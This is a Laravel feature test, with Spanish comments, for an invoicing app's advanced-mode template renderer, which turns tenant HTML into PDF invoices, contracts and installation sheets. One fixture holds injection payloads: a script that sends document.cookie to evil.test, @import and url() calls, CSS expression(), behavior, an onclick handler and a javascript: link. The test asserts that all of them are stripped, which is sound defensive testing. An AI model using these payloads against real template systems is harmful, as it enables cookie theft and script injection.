<?php

namespace Tests\Feature;

use App\Models\CustomerInstallation;
use App\Models\CustomerProfile;
use App\Models\DocumentTemplate;
use App\Models\Invoice;
use App\Models\InvoiceItem;
use App\Models\Tenant;
use App\Models\User;
use App\Services\Templates\TemplateRenderer;
use Barryvdh\DomPDF\Facade\Pdf;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Modo avanzado (is_advanced_mode = true, auditoría 2026-08-01): documento
 * HTML completo del tenant, sin shell fijo, Pdf::loadHTML() directo. Cubre
 * exactamente las reglas no negociables que se pidió no ceder bajo presión
 * de tiempo: script, atributos on-*, url(), @import, expression() y behavior
 * siguen bloqueados incluso en este modo más permisivo, y el pipeline de
 * placeholders (escalares + bloque) es el MISMO que en modo seguro.
 */
class TemplateRendererAdvancedModeTest extends TestCase
{
    use RefreshDatabase;

    private TemplateRenderer $renderer;

    protected function setUp(): void
    {
        parent::setUp();
        $this->renderer = app(TemplateRenderer::class);
    }

    private function makeTenant(): Tenant
    {
        return Tenant::factory()->create(['legal_name' => 'Internet Rápido S.A.S.']);
    }

    private function makeCustomer(Tenant $tenant): User
    {
        $customer = User::factory()->create([
            'tenant_id'     => $tenant->id,
            'user_name'     => 'Juan',
            'user_lastname' => 'Pérez',
        ]);
        CustomerProfile::create([
            'user_id' => $customer->id,
            'name'    => 'Juan',
            'last_name' => 'Pérez',
            'cedula'  => '123456789',
            'address' => 'Calle 1',
        ]);

        return $customer;
    }

    private function makeInvoiceWithItem(Tenant $tenant, User $customer): Invoice
    {
        $invoice = Invoice::create([
            'tenant_id'    => $tenant->id,
            'customer_id'  => $customer->id,
            'invoice_type' => Invoice::TYPE_MONTHLY,
            'number'       => 'FAC-0003',
            'issue_date'   => '2026-07-01',
            'due_date'     => '2026-07-15',
            'period_start' => '2026-07-01',
            'period_end'   => '2026-07-31',
            'currency'     => 'COP',
            'subtotal'     => 100000,
            'tax'          => 0,
            'total'        => 100000,
            'balance_due'  => 100000,
            'status'       => 'issued',
        ])->fresh(['tenant', 'customer.customerProfile']);

        InvoiceItem::create([
            'invoice_id'  => $invoice->id,
            'description' => 'Plan Hogar 100MB',
            'quantity'    => 1,
            'unit_price'  => 100000,
            'amount'      => 100000,
        ]);
        $invoice->load('items');

        return $invoice;
    }

    public function test_advanced_mode_skips_the_shell_and_calls_load_html_directly(): void
    {
        $tenant = $this->makeTenant();
        $customer = $this->makeCustomer($tenant);
        $invoice = $this->makeInvoiceWithItem($tenant, $customer);

        DocumentTemplate::create([
            'tenant_id'        => $tenant->id,
            'type'             => DocumentTemplate::TYPE_INVOICE,
            'body_html'        => '<html><head><style>.card{color:#1e5fa8;border-radius:8px;}</style></head>'
                . '<body><div class="card"><h1>Factura {{factura.numero}}</h1><p>Cliente: {{cliente.nombre}}</p>'
                . '<div>{{factura.tabla_items}}</div></div></body></html>',
            'is_active'        => true,
            'is_advanced_mode' => true,
        ]);

        Pdf::shouldReceive('loadView')->never();
        Pdf::shouldReceive('loadHTML')
            ->once()
            ->withArgs(function ($html) {
                return str_starts_with($html, '<!DOCTYPE html><html><head><meta charset="UTF-8">')
                    && str_contains($html, '<style>')
                    && str_contains($html, 'border-radius:8px')
                    && str_contains($html, 'Factura FAC-0003')
                    && str_contains($html, 'Cliente: Juan')
                    && str_contains($html, 'Plan Hogar 100MB')
                    && str_contains($html, '<table');
            })
            ->andReturn(\Mockery::mock(\Barryvdh\DomPDF\PDF::class));

        $this->renderer->renderInvoice($invoice);
    }

    /**
     * Regla no negociable: aunque el modo avanzado permite CSS/HTML mucho
     * más amplio, script, atributos on-*, url(), @import, expression() y
     * behavior siguen bloqueados exactamente igual que en modo seguro.
     */
    public function test_advanced_mode_still_blocks_script_and_css_escape_vectors(): void
    {
        $tenant = $this->makeTenant();
        $customer = $this->makeCustomer($tenant);
        $invoice = $this->makeInvoiceWithItem($tenant, $customer);

        DocumentTemplate::create([
            'tenant_id'        => $tenant->id,
            'type'             => DocumentTemplate::TYPE_INVOICE,
            'body_html'        => '<html><head><style>'
                . '@import url("https://evil.test/x.css");'
                . '.x { behavior: url(evil.htc); width: expression(alert(1)); background: url(https://evil.test/y.png); }'
                . '</style></head><body>'
                . '<div class="x" onclick="alert(1)">Hola {{cliente.nombre}}</div>'
                . '<script>fetch("https://evil.test/exfil?c="+document.cookie)</script>'
                . '<a href="javascript:alert(1)">click</a>'
                . '</body></html>',
            'is_active'        => true,
            'is_advanced_mode' => true,
        ]);

        Pdf::shouldReceive('loadHTML')
            ->once()
            ->withArgs(function ($html) {
                return !str_contains($html, '<script')
                    && !str_contains($html, 'onclick')
                    && !str_contains($html, '@import')
                    && !str_contains($html, 'behavior')
                    && !str_contains($html, 'expression')
                    && !str_contains($html, 'url(')
                    && !str_contains($html, 'javascript:')
                    && str_contains($html, 'Hola Juan');
            })
            ->andReturn(\Mockery::mock(\Barryvdh\DomPDF\PDF::class));

        $this->renderer->renderInvoice($invoice);
    }

    /**
     * renderContract() y renderInstallationSheet() comparten compileAdvanced()
     * con renderInvoice() (ya cubierto arriba), pero cada método tiene su
     * PROPIO chequeo `if ($template->is_advanced_mode)` — esto confirma que
     * esa rama específica también funciona en los otros 2 tipos de documento,
     * no solo en factura.
     */
    public function test_render_contract_advanced_mode_skips_the_shell(): void
    {
        $tenant = $this->makeTenant();
        $customer = $this->makeCustomer($tenant);

        DocumentTemplate::create([
            'tenant_id'        => $tenant->id,
            'type'             => DocumentTemplate::TYPE_CONTRACT,
            'body_html'        => '<html><body><div>Condiciones para {{cliente.nombre}}</div></body></html>',
            'is_active'        => true,
            'is_advanced_mode' => true,
        ]);

        Pdf::shouldReceive('loadView')->never();
        Pdf::shouldReceive('loadHTML')
            ->once()
            ->withArgs(fn ($html) => str_contains($html, 'Condiciones para Juan'))
            ->andReturn(\Mockery::mock(\Barryvdh\DomPDF\PDF::class));

        $this->renderer->renderContract($customer, $customer->customerProfile, $tenant, null, '', now()->format('d/m/Y'));
    }

    public function test_render_installation_sheet_advanced_mode_skips_the_shell(): void
    {
        $tenant = $this->makeTenant();
        $customer = $this->makeCustomer($tenant);
        $installation = CustomerInstallation::create([
            'tenant_id'      => $tenant->id,
            'customer_id'    => $customer->id,
            'scheduled_date' => '2026-07-25',
            'status'         => 'pendiente',
        ]);

        DocumentTemplate::create([
            'tenant_id'        => $tenant->id,
            'type'             => DocumentTemplate::TYPE_INSTALLATION,
            'body_html'        => '<html><body><div>Instalación de {{cliente.nombre}}</div></body></html>',
            'is_active'        => true,
            'is_advanced_mode' => true,
        ]);

        Pdf::shouldReceive('loadView')->never();
        Pdf::shouldReceive('loadHTML')
            ->once()
            ->withArgs(fn ($html) => str_contains($html, 'Instalación de Juan'))
            ->andReturn(\Mockery::mock(\Barryvdh\DomPDF\PDF::class));

        $this->renderer->renderInstallationSheet(
            $installation,
            $customer,
            $customer->customerProfile,
            null,
            $tenant,
            null,
            collect(),
            null,
            null,
            null,
            '',
            null,
            now()->format('d/m/Y H:i')
        );
    }

    public function test_preview_advanced_mode_uses_load_html_for_an_unsaved_draft(): void
    {
        $tenant = $this->makeTenant();
        $customer = $this->makeCustomer($tenant);
        $invoice = $this->makeInvoiceWithItem($tenant, $customer);

        Pdf::shouldReceive('loadView')->never();
        Pdf::shouldReceive('loadHTML')
            ->once()
            ->withArgs(fn ($html) => str_contains($html, 'Borrador sin guardar') && str_contains($html, 'Juan'))
            ->andReturn(\Mockery::mock(\Barryvdh\DomPDF\PDF::class));

        $this->renderer->previewInvoice(
            $invoice,
            '<html><body><p>Borrador sin guardar para {{cliente.nombre}}</p></body></html>',
            true
        );
    }

    public function test_render_invoice_end_to_end_advanced_mode_compiles_to_a_valid_pdf(): void
    {
        $tenant = $this->makeTenant();
        $customer = $this->makeCustomer($tenant);
        $invoice = $this->makeInvoiceWithItem($tenant, $customer);

        DocumentTemplate::create([
            'tenant_id'        => $tenant->id,
            'type'             => DocumentTemplate::TYPE_INVOICE,
            'body_html'        => '<html><head><style>h1{color:#1e5fa8;}</style></head>'
                . '<body><h1>Factura {{factura.numero}}</h1><div>{{factura.tabla_items}}</div></body></html>',
            'is_active'        => true,
            'is_advanced_mode' => true,
        ]);

        // Sin mocks: prueba que el pipeline completo compila a un PDF real.
        $pdf = $this->renderer->renderInvoice($invoice);

        $this->assertStringStartsWith('%PDF-', $pdf->output());
    }
}
